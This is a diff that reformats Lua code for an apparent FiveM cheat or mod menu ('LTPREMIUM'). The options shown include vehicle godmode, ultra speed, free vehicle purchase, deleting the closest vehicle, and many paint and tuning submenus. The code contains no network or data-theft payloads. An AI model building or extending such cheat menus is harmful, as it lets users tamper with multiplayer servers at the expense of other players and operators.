-					elseif LTPREMIUM.Button("Repair Engine Only") then
-					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
-    if not DoesEntityExist(veh) then
-        drawNotification(
-            "~r~You Aren't Sitting In A Vehicle Stupid"
-        )
-    else
-				SetVehicleUndriveable(veh,false)
-				SetVehicleEngineHealth(veh, 1000.0)
-				SetVehiclePetrolTankHealth(veh, 1000.0)
-				healthEngineLast=1000.0
-				healthPetrolTankLast=1000.0
-					SetVehicleEngineOn(veh, true, false )
-				SetVehicleOilLevel(veh, 1000.0)
-		end
-						elseif LTPREMIUM.Button("~g~Buy vehicle for free") then fv()
-				elseif
-					LTPREMIUM.CheckBox(
-					"~r~~h~Ultra Speed",
-					Nigubdddddd,
-					function(enabled)
-					Nigubdddddd = enabled
-					end)
-				then
-					elseif
-					LTPREMIUM.CheckBox(
-					"~w~Rainbow Vehicle Colour",
-					RainbowVeh,
-					function(enabled)
-					RainbowVeh = enabled
-					end)
-				then
-				elseif
-					LTPREMIUM.CheckBox(
-					"~w~Rainbow Vehicle Neon",
-					ou328hNeon,
-					function(enabled)
-					ou328hNeon = enabled
-					end)
-				then
-				elseif
-					LTPREMIUM.CheckBox(
-					"~w~Rainbow Sync",
-					ou328hSync,
-					function(enabled)
-					ou328hSync = enabled
-					end)
-				then
-				elseif
-					LTPREMIUM.CheckBox(
-					"Keep Vehicle Clean",
-					LOJWDNDDNDN,
-					function(enabled)
-					LOJWDNDDNDN = enabled
-					end)
-				then
+                elseif LTPREMIUM.Button("Repair Engine Only") then
+                    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
+                    if not DoesEntityExist(veh) then
+                        drawNotification(
+                            "~r~You Aren't Sitting In A Vehicle Stupid"
+                        )
+                    else
+                        SetVehicleUndriveable(veh, false)
+                        SetVehicleEngineHealth(veh, 1000.0)
+                        SetVehiclePetrolTankHealth(veh, 1000.0)
+                        healthEngineLast = 1000.0
+                        healthPetrolTankLast = 1000.0
+                        SetVehicleEngineOn(veh, true, false)
+                        SetVehicleOilLevel(veh, 1000.0)
+                    end
+                elseif LTPREMIUM.Button("~g~Buy vehicle for free") then
+                    fv()
+                elseif
+                    LTPREMIUM.CheckBox(
+                        "~r~~h~Ultra Speed",
+                        Nigubdddddd,
+                        function(enabled)
+                            Nigubdddddd = enabled
+                        end)
+                then
+                elseif
+                    LTPREMIUM.CheckBox(
+                        "~w~Rainbow Vehicle Colour",
+                        RainbowVeh,
+                        function(enabled)
+                            RainbowVeh = enabled
+                        end)
+                then
+                elseif
+                    LTPREMIUM.CheckBox(
+                        "~w~Rainbow Vehicle Neon",
+                        ou328hNeon,
+                        function(enabled)
+                            ou328hNeon = enabled
+                        end)
+                then
+                elseif
+                    LTPREMIUM.CheckBox(
+                        "~w~Rainbow Sync",
+                        ou328hSync,
+                        function(enabled)
+                            ou328hSync = enabled
+                        end)
+                then
+                elseif
+                    LTPREMIUM.CheckBox(
+                        "Keep Vehicle Clean",
+                        LOJWDNDDNDN,
+                        function(enabled)
+                            LOJWDNDDNDN = enabled
+                        end)
+                then
                 elseif LTPREMIUM.MenuButton("~r~→  ~s~LS Customs", "LSC") then
-				                elseif
+                elseif
                     LTPREMIUM.CheckBox(
                         'Speedboost ~g~SHIFT ~r~CTRL',
                         VehSpeed,
@@ -6279,232 +6427,545 @@ for i, dA in pairs(bd) do
                             VehSpeed = dl
                         end
                     )
-                 then
+                then
                 elseif LTPREMIUM.Button("Delete Vehicle") then
                     DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
-				elseif LTPREMIUM.Button("Delete Closest Vehicle") then
-                        local PlayerCoords = GetEntityCoords(PlayerPedId())
-                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
-				elseif
-					LTPREMIUM.CheckBox(
-						"No Fall",
-						Nofall,
-						function(enabled)
-							Nofall = enabled
+                elseif LTPREMIUM.Button("Delete Closest Vehicle") then
+                    local PlayerCoords = GetEntityCoords(PlayerPedId())
+                    DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
+                elseif
+                    LTPREMIUM.CheckBox(
+                        "No Fall",
+                        Nofall,
+                        function(enabled)
+                            Nofall = enabled
 
-							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
-						end
-					)
-				 then
-				elseif LTPREMIUM.Button("Change license plate") then
-					local playerPed = GetPlayerPed(-1)
-					local playerVeh = GetVehiclePedIsIn(playerPed, true)
-					local result = KeyboardInput("Enter the plate license you want", "", 10)
-					if result then
-						SetVehicleNumberPlateText(playerVeh, result)
-						end
-						                elseif LTPREMIUM.CheckBox(
-                    "Vehicle Godmode",
-                    VehGod,
-                    function(enabled)
-                        VehGod = enabled
-                    end)
+                            SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
+                        end
+                    )
                 then
-				elseif LTPREMIUM.Button("Flip Up Vehicle") then
-				local ped = GetPlayerPed(-1)
-		        local veh = GetVehiclePedIsIn(ped)
-	             FreezeEntityPosition(veh,false)
-	             SetVehicleOnGroundProperly(veh)
-	            SetVehicleEngineOn(veh, true)
-				elseif LTPREMIUM.Button("Make vehicle dirty") then
-					Clean(GetVehiclePedIsUsing(PlayerPedId()))
-					drawNotification("~r~Vehicle is now dirty")
-				elseif LTPREMIUM.Button("Make vehicle clean") then
-					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
-					drawNotification("~r~Vehicle is now clean")
+                elseif LTPREMIUM.Button("Change license plate") then
+                    local playerPed = GetPlayerPed(-1)
+                    local playerVeh = GetVehiclePedIsIn(playerPed, true)
+                    local result = KeyboardInput("Enter the plate license you want", "", 10)
+                    if result then
+                        SetVehicleNumberPlateText(playerVeh, result)
+                    end
+                elseif LTPREMIUM.CheckBox(
+                        "Vehicle Godmode",
+                        VehGod,
+                        function(enabled)
+                            VehGod = enabled
+                        end)
+                then
+                elseif LTPREMIUM.Button("Flip Up Vehicle") then
+                    local ped = GetPlayerPed(-1)
+                    local veh = GetVehiclePedIsIn(ped)
+                    FreezeEntityPosition(veh, false)
+                    SetVehicleOnGroundProperly(veh)
+                    SetVehicleEngineOn(veh, true)
+                elseif LTPREMIUM.Button("Make vehicle dirty") then
+                    Clean(GetVehiclePedIsUsing(PlayerPedId()))
+                    drawNotification("~r~Vehicle is now dirty")
+                elseif LTPREMIUM.Button("Make vehicle clean") then
+                    Clean2(GetVehiclePedIsUsing(PlayerPedId()))
+                    drawNotification("~r~Vehicle is now clean")
                 end
 
                 LTPREMIUM.Display()
-			elseif LTPREMIUM.IsMenuOpened("tunings") then 
-                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
-                    for i, dA in pairs(bd) do
-                        if dA.
-                    id == "extra"
-                    and# checkValidVehicleExtras()  ~= 0 then
-                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
+            elseif LTPREMIUM.IsMenuOpened("tunings") then
+                veh = GetVehiclePedIsUsing(PlayerPedId())
+                for i, dA in pairs(bd) do
+                    if dA.
+                        id == "extra"
+                        and # checkValidVehicleExtras() ~= 0 then
+                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end
+                    elseif dA.id == "neon"
                     then
-                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
+                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end
+                    elseif dA.id == "paint"
                     then
-                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
+                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end
+                    elseif dA.id == "wheeltypes"
                     then
-                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
+                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end
+                    elseif dA.id == "headlight"
                     then
-                    if LTPREMIUM.MenuButton(dA.name, dA.id) then end
-                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
-                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end;
-                    break end end end;
-                    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
-                    else xenonStatus = "Not Installed"
-                    end;
-                    if LTPREMIUM.Button("Xenon Headlight", xenonStatus) then
-                    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
-                    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; 
-                    
-                    LTPREMIUM.Display() 
-                elseif LTPREMIUM.IsMenuOpened("performance") then 
-                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
-                    for i, dA in pairs(be) do
-                        if LTPREMIUM.MenuButton(dA.name, dA.id) then 
-                        end 
+                        if LTPREMIUM.MenuButton(dA.name, dA.id) then end
+                    else
+                        local as = checkValidVehicleMods(dA.id)
+                        for dG, dH in pairs(as) do
+                            if LTPREMIUM.MenuButton(dA.name, dA.id) then end;
+                            break
+                        end
                     end
-                    if IsToggleModOn(veh, 18) then 
-                        turboStatus = "Installed"
-                    else 
-                        turboStatus = "Not Installed"
+                end;
+                if IsToggleModOn(veh, 22) then
+                    xenonStatus = "Installed"
+                else
+                    xenonStatus = "Not Installed"
+                end;
+                if LTPREMIUM.Button("Xenon Headlight", xenonStatus) then
+                    if not IsToggleModOn(veh, 22) then
+                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
+                    else
+                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                     end
-                    if LTPREMIUM.Button("Turbo Tune", turboStatus) then
-                        if not IsToggleModOn(veh, 18) then 
-                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
-                        else 
-                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) 
-                        end 
-                    end 
-                    LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("primary") then LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic1") LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic1") LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte1") LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal1") LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("secondary") then LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic2") LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic2") LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte2") LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal2") LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("rimpaint") then LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic3") LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic3") LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte3") LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal3") LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("classic1") then
-                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and tp == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metallic1") then
-                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and tp == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("matte1") then
-                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and tp == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metal1") then
-                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and tp == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("classic2") then
-                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metallic2") then
-                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("matte2") then
-                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metal2") then
-                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; curprim, cursec = GetVehicleColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("classic3") then
-                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metallic3") then
-                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("matte3") then
-                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; LTPREMIUM.Display() elseif LTPREMIUM.IsMenuOpened("metal3") then
-                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
-                    dT.id and not b8 then pricetext = "Installed"
-                    else if b8 and ts == dT.id then pricetext = "Previewing"
-                    else pricetext = "Not Installed"
-                    end end; _, currims = GetVehicleExtraColours(veh) if LTPREMIUM.Button(dT.name, pricetext) then
-                    if not b8 then ba = "paint"
-                    bc = false
-                     oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) 
-                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
-                     SetVehicleExtraColours(veh, oldpearl, dT.id) 
-                     b8 = true elseif b8 and currims == dT.id then 
-                        SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end;
-    
-                    LTPREMIUM.Display()
+                end;
+
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("performance") then
+                veh = GetVehiclePedIsUsing(PlayerPedId())
+                for i, dA in pairs(be) do
+                    if LTPREMIUM.MenuButton(dA.name, dA.id) then
+                    end
+                end
+                if IsToggleModOn(veh, 18) then
+                    turboStatus = "Installed"
+                else
+                    turboStatus = "Not Installed"
+                end
+                if LTPREMIUM.Button("Turbo Tune", turboStatus) then
+                    if not IsToggleModOn(veh, 18) then
+                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
+                    else
+                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
+                    end
+                end
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("primary") then
+                LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic1")
+                LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic1")
+                LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte1")
+                LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal1")
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("secondary") then
+                LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic2")
+                LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic2")
+                LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte2")
+                LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal2")
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("rimpaint") then
+                LTPREMIUM.MenuButton("~r~→  ~s~Classic", "classic3")
+                LTPREMIUM.MenuButton("~r~→  ~s~Metallic", "metallic3")
+                LTPREMIUM.MenuButton("~r~→  ~s~Matte", "matte3")
+                LTPREMIUM.MenuButton("~r~→  ~s~Metal", "metal3")
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("classic1") then
+                for dS, dT in pairs(bg) do
+                    tp, ts = GetVehicleColours(veh)
+                    if tp ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and tp == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = true
+                        elseif b8 and curprim == dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and curprim ~= dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("metallic1") then
+                for dS, dT in pairs(bg) do
+                    tp, ts = GetVehicleColours(veh)
+                    if tp ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and tp == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = true
+                        elseif b8 and curprim == dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and curprim ~= dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("matte1") then
+                for dS, dT in pairs(bi) do
+                    tp, ts = GetVehicleColours(veh)
+                    if tp ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and tp == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            b8 = true
+                        elseif b8 and curprim == dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and curprim ~= dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("metal1") then
+                for dS, dT in pairs(bj) do
+                    tp, ts = GetVehicleColours(veh)
+                    if tp ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and tp == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
+                            b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            b8 = true
+                        elseif b8 and curprim == dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and curprim ~= dT.id then
+                            SetVehicleColours(veh, dT.id, oldsec)
+                            SetVehicleExtraColours(veh, dT.id, oldwheelcolour)
+                            b8 = true
+                        end
+                    end
+                end; LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("classic2") then
+                for dS, dT in pairs(bg) do
+                    tp, ts = GetVehicleColours(veh)
+                    if ts ==
+                        dT.id and not b8 then
+                        pricetext = "Installed"
+                    else
+                        if b8 and ts == dT.id then
+                            pricetext = "Previewing"
+                        else
+                            pricetext = "Not Installed"
+                        end
+                    end; curprim, cursec = GetVehicleColours(veh)
+                    if LTPREMIUM.Button(dT.name, pricetext) then
+                        if not b8 then
+                            ba = "paint"
+                            bc = false; oldprim, oldsec = GetVehicleColours(veh)
+                            b9 = table.pack(oldprim, oldsec)
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        elseif b8 and cursec == dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = false; ba = -1; b9 = -1
+                        elseif b8 and cursec ~= dT.id then
+                            SetVehicleColours(veh, oldprim, dT.id)
+                            b8 = true
+                        end
+                    end
